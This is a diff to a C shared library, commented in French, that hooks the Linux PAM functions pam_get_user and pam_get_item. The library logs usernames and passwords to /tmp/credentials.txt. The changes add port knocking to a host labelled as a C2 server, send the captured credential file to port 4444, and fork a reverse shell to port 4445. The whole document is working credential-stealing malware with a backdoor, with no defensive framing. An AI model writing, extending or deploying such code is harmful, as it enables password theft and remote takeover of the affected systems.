@@ -13,14 +13,20 @@
 #include <security/pam_appl.h>
 #include <security/pam_modules.h>
 
-// Définition des pointeurs pour les fonctions PAM d'origine
+// Fonctions PAM d'origine
 typedef int (*pam_get_item_t)(const pam_handle_t *, int, const void **);
 typedef int (*pam_get_user_t)(pam_handle_t *, const char **, const char *);
 
-// Chemin du fichier pour stocker temporairement les credentials
-#define CREDENTIALS_FILE "/tmp/credentials.txt"
+// Config
+#define CREDENTIALS_FILE   "/tmp/credentials.txt"
+#define REMOTE_HOST        "192.168.64.11"  // IP de ton C2
+#define KNOCK_PORT1        5001
+#define KNOCK_PORT2        5002
+#define KNOCK_PORT3        5003
+#define CREDENTIALS_PORT   4444
+#define SHELL_PORT         4445
 
-// Fonction pour obtenir l'heure actuelle en tant que chaîne
+// Obtenir l'heure
 static const char *get_current_time() {
     static char buffer[20];
     time_t raw_time = time(NULL);
@@ -29,7 +35,7 @@ static const char *get_current_time() {
     return buffer;
 }
 
-// Fonction pour écrire les credentials dans un fichier local
+// Écriture dans /tmp/credentials.txt
 static void write_to_file(const char *type, const char *data) {
     FILE *file = fopen(CREDENTIALS_FILE, "a");
     if (!file) {
@@ -40,93 +46,147 @@ static void write_to_file(const char *type, const char *data) {
     fclose(file);
 }
 
-// Fonction pour envoyer les données via TCP
-static void send_file_tcp(const char *remote_host, int remote_port) {
+// Port knocking (TCP connect "rapide")
+static int port_knock(const char *ip, int port) {
     int sock;
-    struct sockaddr_in server_addr;
-    char buffer[1024];
-    FILE *file;
+    struct sockaddr_in srv;
 
-    // Création du socket
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
-        syslog(LOG_ERR, "[ERROR] Échec de la création du socket : %m");
+        syslog(LOG_ERR, "[ERROR] port_knock: socket : %m");
+        return -1;
+    }
+    memset(&srv, 0, sizeof(srv));
+    srv.sin_family = AF_INET;
+    srv.sin_port   = htons(port);
+    inet_pton(AF_INET, ip, &srv.sin_addr);
+
+    if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) < 0) {
+        // "Connection refused" est normal si le port n'est pas ouvert
+        syslog(LOG_ERR, "[ERROR] port_knock: connexion %s:%d échouée : %m", ip, port);
+    } else {
+        syslog(LOG_INFO, "[INFO] Knock réussi sur %s:%d", ip, port);
+    }
+    close(sock);
+    return 0;
+}
+
+// Envoie le fichier local sur le port remote_port
+static void send_file_tcp(const char *ip, int remote_port) {
+    int sock;
+    struct sockaddr_in srv;
+    char buffer[1024];
+
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) {
+        syslog(LOG_ERR, "[ERROR] send_file_tcp: socket : %m");
         return;
     }
 
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(remote_port);
-    inet_pton(AF_INET, remote_host, &server_addr.sin_addr);
+    memset(&srv, 0, sizeof(srv));
+    srv.sin_family = AF_INET;
+    srv.sin_port   = htons(remote_port);
+    inet_pton(AF_INET, ip, &srv.sin_addr);
 
-    // Connexion au serveur
-    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-        syslog(LOG_ERR, "[ERROR] Échec de la connexion au serveur : %m");
+    if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) < 0) {
+        syslog(LOG_ERR, "[ERROR] Échec connexion %s:%d : %m", ip, remote_port);
         close(sock);
         return;
     }
 
-    // Lecture et envoi du fichier
-    file = fopen(CREDENTIALS_FILE, "r");
-    if (!file) {
-        syslog(LOG_ERR, "[ERROR] Impossible d'ouvrir le fichier local pour l'envoi");
+    FILE *f = fopen(CREDENTIALS_FILE, "r");
+    if (!f) {
+        syslog(LOG_ERR, "[ERROR] Impossible d'ouvrir %s pour l'envoi", CREDENTIALS_FILE);
         close(sock);
         return;
     }
 
     size_t bytes_read;
-    while ((bytes_read = fread(buffer, 1, sizeof(buffer), file)) > 0) {
+    while ((bytes_read = fread(buffer, 1, sizeof(buffer), f)) > 0) {
         if (send(sock, buffer, bytes_read, 0) < 0) {
-            syslog(LOG_ERR, "[ERROR] Échec de l'envoi des données : %m");
-            fclose(file);
+            syslog(LOG_ERR, "[ERROR] Échec envoi data : %m");
+            fclose(f);
             close(sock);
             return;
         }
     }
 
-    fclose(file);
+    fclose(f);
     close(sock);
+    syslog(LOG_INFO, "[INFO] Fichier %s envoyé à %s:%d", CREDENTIALS_FILE, ip, remote_port);
 }
 
-// Intercepteur pour pam_get_user
-int pam_get_user(pam_handle_t *pamh, const char **user, const char *prompt) {
-    static pam_get_user_t original_pam_get_user = NULL;
+// Pour exécuter le reverse shell
+static void launch_reverse_shell(const char *ip, int port) {
+    pid_t pid = fork();
+    if (pid == 0) {
+        // Enfant => on ne bloque pas le process pam/sshd
+        int s = socket(AF_INET, SOCK_STREAM, 0);
 
+        struct sockaddr_in srv;
+        memset(&srv, 0, sizeof(srv));
+        srv.sin_family = AF_INET;
+        srv.sin_port   = htons(port);
+        inet_pton(AF_INET, ip, &srv.sin_addr);
+
+        connect(s, (struct sockaddr *)&srv, sizeof(srv));
+        dup2(s, 0);
+        dup2(s, 1);
+        dup2(s, 2);
+
+        execl("/bin/sh", "sh", NULL);
+        _exit(0);
+    }
+}
+
+// --------------------------------------------------------------
+// Intercepteurs PAM
+// --------------------------------------------------------------
+static pam_get_user_t original_pam_get_user = NULL;
+int pam_get_user(pam_handle_t *pamh, const char **user, const char *prompt) {
     if (!original_pam_get_user) {
         original_pam_get_user = (pam_get_user_t)dlsym(RTLD_NEXT, "pam_get_user");
         if (!original_pam_get_user) {
-            syslog(LOG_ERR, "[ERROR] Impossible de localiser pam_get_user : %s", dlerror());
+            syslog(LOG_ERR, "[ERROR] pam_get_user: dlsym : %s", dlerror());
             return PAM_SYSTEM_ERR;
         }
     }
 
     int retval = original_pam_get_user(pamh, user, prompt);
     if (retval == PAM_SUCCESS && *user) {
-        // On écrit le login
         write_to_file("Login", *user);
     }
-
-    return retval; // On ne bloque pas, renvoie le code PAM initial
+    return retval;
 }
 
-// Intercepteur pour pam_get_item
+static pam_get_item_t original_pam_get_item = NULL;
 int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
-    static pam_get_item_t original_pam_get_item = NULL;
-
     if (!original_pam_get_item) {
         original_pam_get_item = (pam_get_item_t)dlsym(RTLD_NEXT, "pam_get_item");
         if (!original_pam_get_item) {
-            syslog(LOG_ERR, "[ERROR] Impossible de localiser pam_get_item : %s", dlerror());
+            syslog(LOG_ERR, "[ERROR] pam_get_item: dlsym : %s", dlerror());
             return PAM_SYSTEM_ERR;
         }
     }
 
     int retval = original_pam_get_item(pamh, item_type, item);
     if (retval == PAM_SUCCESS && item_type == PAM_AUTHTOK && item && *item) {
-        // On récupère le mot de passe
+        // On chope le mot de passe
         write_to_file("Mot de passe", (const char *)*item);
 
-        // Envoi du fichier après avoir capturé le mot de passe
-        send_file_tcp("192.168.64.11", 4444);
+        // 1) Knocks
+        port_knock(REMOTE_HOST, KNOCK_PORT1);
+        sleep(1);
+        port_knock(REMOTE_HOST, KNOCK_PORT2);
+        sleep(1);
+        port_knock(REMOTE_HOST, KNOCK_PORT3);
+        sleep(1);
+
+        // 2) Envoi du fichier sur 4444
+        send_file_tcp(REMOTE_HOST, CREDENTIALS_PORT);
+
+        // 3) Reverse shell vers 4445
+        launch_reverse_shell(REMOTE_HOST, SHELL_PORT);
     }
 
     return retval;
